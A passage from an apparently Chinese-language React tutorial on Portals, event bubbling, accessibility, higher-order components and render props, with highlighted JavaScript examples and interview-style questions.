class="hljs-title function_">loadRemoteComponent</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> remoteModule = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>[appName].<span class="hljs-title function_">get</span>(componentName);<br>        <span class="hljs-title function_">setComponent</span>(<span class="hljs-function">() =&gt;</span> remoteModule);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`加载 <span class="hljs-subst">$&#123;appName&#125;</span>/<span class="hljs-subst">$&#123;componentName&#125;</span> 失败:`</span>, error);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">loadRemoteComponent</span>();<br>  &#125;, [appName, componentName]);<br>  <br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Component</span>) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span> <span class="hljs-attr">containerId</span>=<span class="hljs-string">&#123;</span>`$&#123;<span class="hljs-attr">appName</span>&#125;<span class="hljs-attr">-portal</span>`&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Component</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>&lt;<span class="hljs-title class_">MicroFrontendPortal</span> <br>  appName=<span class="hljs-string">&quot;billingApp&quot;</span> <br>  componentName=<span class="hljs-string">&quot;PaymentWidget&quot;</span> <br>/&gt;<br></code></pre></td></tr></table></figure><h3 id="面试高频问题解析-1"><a href="#面试高频问题解析-1" class="headerlink" title="面试高频问题解析"></a>面试高频问题解析</h3><p><strong>Q：Portals 和普通渲染有什么区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">普通渲染</th><th align="left">Portal</th></tr></thead><tbody><tr><td align="left">DOM 位置</td><td align="left">父组件内</td><td align="left">任意 DOM 节点</td></tr><tr><td align="left">事件冒泡</td><td align="left">遵循 DOM 结构</td><td align="left">遵循 React 树结构</td></tr><tr><td align="left">上下文访问</td><td align="left">正常访问</td><td align="left">正常访问</td></tr><tr><td align="left">样式继承</td><td align="left">受父容器影响</td><td align="left">可避免父容器影响</td></tr><tr><td align="left">应用场景</td><td align="left">常规 UI</td><td align="left">模态框、通知等</td></tr></tbody></table><p><strong>Q：为什么 Portal 的事件冒泡到 React 父组件？</strong></p><ul><li>Portal 的特殊之处在于它在 DOM 树中的位置是独立的</li><li>但 React 的事件系统是合成的，不依赖实际 DOM 结构</li><li>事件冒泡基于 React 组件树结构，而非实际 DOM 结构</li><li>因此 Portal 中的事件会冒泡到 React 树中的父组件</li></ul><p><strong>Q：如何阻止 Portal 的事件冒泡？</strong></p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">PortalWithStopPropagation</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePortalClick</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止事件冒泡</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Portal 点击&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handlePortalClick&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>点击我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;portal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：Portals 对无障碍有什么影响？</strong></p><p>最佳实践：</p><ul><li>焦点管理：打开 Portal 时移动焦点到内容，关闭时返回焦点</li><li>ARIA 属性：使用 role&#x3D;”dialog” 和 aria-modal&#x3D;”true”</li><li>键盘导航：实现 ESC 关闭和 Tab 键陷阱</li><li>屏幕阅读器：使用 aria-labelledby 关联标题</li><li>背景遮蔽：添加 aria-hidden&#x3D;”true” 到背景内容</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul><li>核心价值：<ul><li>突破 CSS 层级限制（overflow, z-index, transform）</li><li>保持 React 上下文和事件系统</li><li>实现全局 UI 元素（模态框、通知、工具提示）</li></ul></li><li>关键技术：<ul><li>ReactDOM.createPortal() API</li><li>动态容器管理</li><li>事件冒泡处理</li><li>无障碍支持</li></ul></li><li>最佳实践：<ul><li>模态框实现（包含焦点管理）</li><li>全局通知系统</li><li>服务端渲染兼容</li><li>微前端集成</li></ul></li><li>React 18 增强：<ul><li>新的 Root API 支持</li><li>并发渲染兼容</li><li>更精细的控制能力</li></ul></li><li>企业级应用：<ul><li>安全沙箱模式</li><li>性能优化策略</li><li>调试与监控</li></ul></li><li>面试重点：<ul><li>Portals 与普通渲染的区别</li><li>事件冒泡机制</li><li>无障碍实现</li><li>服务端渲染处理</li></ul></li></ul><h2 id="4-5-高阶组件（HOC）与-Render-Props"><a href="#4-5-高阶组件（HOC）与-Render-Props" class="headerlink" title="4.5 高阶组件（HOC）与 Render Props"></a>4.5 高阶组件（HOC）与 Render Props</h2><h3 id="组件复用的核心挑战"><a href="#组件复用的核心挑战" class="headerlink" title="组件复用的核心挑战"></a>组件复用的核心挑战</h3><p><strong>传统组件复用的问题</strong></p><pre class="mermaid">graph TD    A[组件复用需求] --> B[直接继承]    A --> C[组合模式]    B --> D[紧耦合]    B --> E[灵活性差]    C --> F[多层嵌套]    C --> G[props 透传问题]</pre><p><strong>解决方案对比</strong></p><table><thead><tr><th align="left">模式</th><th align="left">核心思想</th><th align="left">适用场景</th><th align="left">优点</th><th align="left">缺点</th></tr></thead><tbody><tr><td align="left">高阶组件 (HOC)</td><td align="left">函数接受组件返回新组件</td><td align="left">横切关注点</td><td align="left">逻辑复用强</td><td align="left">嵌套过深</td></tr><tr><td align="left">Render Props</td><td align="left">组件通过 prop 渲染内容</td><td align="left">动态组合</td><td align="left">灵活直观</td><td align="left">回调地狱</td></tr><tr><td align="left">自定义 Hooks</td><td align="left">函数封装可复用逻辑</td><td align="left">功能复用</td><td align="left">简洁高效</td><td align="left">仅函数组件</td></tr></tbody></table><h3 id="高阶组件（HOC）深度解析"><a href="#高阶组件（HOC）深度解析" class="headerlink" title="高阶组件（HOC）深度解析"></a>高阶组件（HOC）深度解析</h3><p><strong>HOC 核心概念</strong></p><p>定义：高阶组件是一个函数，接受一个组件并返回一个新的增强组件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EnhancedComponent</span> = <span class="hljs-title function_">withEnhancement</span>(<span class="hljs-title class_">WrappedComponent</span>);<br></code></pre></td></tr></table></figure><p><strong>HOC 实现模式</strong></p><p>(1) 属性代理（Props Proxy）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-params">WrappedComponent, fetchUrl</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">fetch</span>(fetchUrl)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;))<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; error, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;));<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">const</span> &#123; data, loading, error &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>;<br>      <br>      <span class="hljs-comment">// 注入额外 props</span><br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          &#123;<span class="hljs-attr">...this.props</span>&#125; </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">loading</span>=<span class="hljs-string">&#123;loading&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;error&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserProfileWithData</span> = <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-title class_">UserProfile</span>, <span class="hljs-string">&#x27;/api/user/123&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(2) 反向继承（Inheritance Inversion）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withLogging</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">WrappedComponent</span> &#123;<br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Component mounted:&#x27;</span>, <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span>);<br>      <span class="hljs-variable language_">super</span>.<span class="hljs-property">componentDidMount</span>?.();<br>    &#125;<br>    <br>    <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Component unmounted:&#x27;</span>, <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span>);<br>      <span class="hljs-variable language_">super</span>.<span class="hljs-property">componentWillUnmount</span>?.();<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// 可操作渲染输出</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">hidden</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">render</span>();<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">EnhancedComponent</span> = <span class="hljs-title function_">withLogging</span>(<span class="hljs-title class_">MyComponent</span>);<br></code></pre></td></tr></table></figure><p><strong>HOC 链式组合</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 组合多个 HOC</span><br><span class="hljs-keyword">const</span> enhance = <span class="hljs-title function_">compose</span>(<br>  withRouter,<br>  <span class="hljs-title function_">withStyles</span>(styles),<br>  <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>),<br>  withErrorBoundary<br>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SuperComponent</span> = <span class="hljs-title function_">enhance</span>(<span class="hljs-title class_">BaseComponent</span>);<br><br><span class="hljs-comment">// 自定义 compose 函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compose</span>(<span class="hljs-params">...hocs</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">Component</span> =&gt;</span> <br>    hocs.<span class="hljs-title function_">reduceRight</span>(<span class="hljs-function">(<span class="hljs-params">acc, hoc</span>) =&gt;</span> <span class="hljs-title function_">hoc</span>(acc), <span class="hljs-title class_">Component</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>HOC 最佳实践</strong></p><p>(1) 显示名称设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withDisplayName</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">WithDisplayName</span> = props =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>  <br>  <span class="hljs-comment">// 设置 displayName 便于调试</span><br>  <span class="hljs-keyword">const</span> displayName = <br>    <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">displayName</span> || <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span> || <span class="hljs-string">&#x27;Component&#x27;</span>;<br>  <br>  <span class="hljs-title class_">WithDisplayName</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">`WithDisplayName(<span class="hljs-subst">$&#123;displayName&#125;</span>)`</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">WithDisplayName</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 静态方法复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copyStaticMethods</span>(<span class="hljs-params">WrappedComponent, EnhancedComponent</span>) &#123;<br>  <span class="hljs-comment">// 复制静态方法</span><br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">WrappedComponent</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">WrappedComponent</span>[key] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-title class_">EnhancedComponent</span>[key] = <span class="hljs-title class_">WrappedComponent</span>[key];<br>    &#125;<br>  &#125;);<br>  <br>  <span class="hljs-comment">// 复制静态属性</span><br>  <span class="hljs-title class_">EnhancedComponent</span>.<span class="hljs-property">staticProperty</span> = <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">staticProperty</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">EnhancedComponent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) Refs 转发</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withRefForwarding</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">WithRefForwarding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">const</span> &#123; forwardedRef, ...rest &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;<br>      <br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;forwardedRef&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          &#123;<span class="hljs-attr">...rest</span>&#125; </span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br>      );<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 使用 forwardRef 转发 ref</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WithRefForwarding</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">forwardedRef</span>=<span class="hljs-string">&#123;ref&#125;</span> /&gt;</span></span><br>  ));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Render-Props-深度解析"><a href="#Render-Props-深度解析" class="headerlink" title="Render Props 深度解析"></a>Render Props 深度解析</h3><p><strong>Render Props 核心概念</strong></p><p>定义：组件通过一个函数 prop（通常命名为 render 或 children）来动态决定渲染内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">DataProvider</span> render=&#123;<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>)&#125; /&gt;<br></code></pre></td></tr></table></figure><p><strong>基础实现模式</strong></p><p>(1) 标准 Render Prop</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MouseTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  handleMouseMove = <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>      <span class="hljs-attr">x</span>: event.<span class="hljs-property">clientX</span>,<br>      <span class="hljs-attr">y</span>: event.<span class="hljs-property">clientY</span><br>    &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onMouseMove</span>=<span class="hljs-string">&#123;this.handleMouseMove&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;this.props.render(this.state)&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br>&lt;<span class="hljs-title class_">MouseTracker</span> render=&#123;<span class="hljs-function">(<span class="hljs-params">&#123; x, y &#125;</span>) =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>鼠标位置: (&#123;x&#125;, &#123;y&#125;)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br>)&#125; /&gt;<br></code></pre></td></tr></table></figure><p>(2) Children as Function</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Toggle</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [on, setOn] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setOn</span>(!on);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(&#123;<br>    on,<br>    toggle<br>  &#125;);<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br>&lt;<span class="hljs-title class_">Toggle</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; on, toggle &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;toggle&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;on ? &#x27;ON&#x27; : &#x27;OFF&#x27;&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      &#123;on &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">Modal</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;开启状态&quot;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">Toggle</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>高级 Render Props 模式</strong></p><p>(1) 组合多个 Render Props</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CombinedProvider</span>(<span class="hljs-params">&#123; data, theme, children &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;dataProps =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">          &#123;themeProps =&gt; children(&#123; ...dataProps, ...themeProps &#125;)&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span></span><br><span class="language-xml">      )&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataProvider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br>&lt;<span class="hljs-title class_">CombinedProvider</span> data=&#123;apiData&#125; theme=<span class="hljs-string">&quot;dark&quot;</span>&gt;<br>  &#123;<span class="hljs-function">(<span class="hljs-params">&#123; data, loading, theme &#125;</span>) =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;</span>`<span class="hljs-attr">app</span> $&#123;<span class="hljs-attr">theme</span>&#125;`&#125;&gt;</span></span><br><span class="language-xml">      &#123;loading ? <span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span> : <span class="hljs-tag">&lt;<span class="hljs-name">Content</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )&#125;<br>&lt;/<span class="hljs-title class_">CombinedProvider</span>&gt;<br></code></pre></td></tr></table></figure><p>(2) Render Props + Hooks</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 